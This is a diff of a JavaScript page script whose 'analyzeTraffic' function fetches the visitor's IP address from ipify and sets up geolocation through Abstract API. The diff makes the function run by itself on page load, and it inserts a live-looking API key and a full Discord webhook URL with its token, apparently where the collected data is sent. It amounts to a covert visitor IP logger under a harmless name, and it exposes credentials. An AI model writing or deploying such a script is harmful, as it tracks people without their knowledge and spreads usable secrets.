@@ -1,4 +1,5 @@
- function httpGetAsync(url, callback) {
+
+    function httpGetAsync(url, callback) {
         const xmlHttp = new XMLHttpRequest();
         xmlHttp.onreadystatechange = function() {
             if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
@@ -10,8 +11,8 @@
 
     function analyzeTraffic() {
         const ipUrl = "https://api64.ipify.org?format=json";
-        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=YOUR_API_KEY"; // Replace with your Abstract API key
-        const discordWebhook = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your Abstract API key
+        const discordWebhook = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT'; // Replace with your Discord webhook URL
 
         httpGetAsync(ipUrl, function(ipData) {
             const ipInfo = JSON.parse(ipData);
@@ -89,4 +90,6 @@
     }
 
     window.onload = function() {
-        analyzeTraffic(); 
+        analyzeTraffic(); // Automatically run the analysis when the page loads
+    };
+
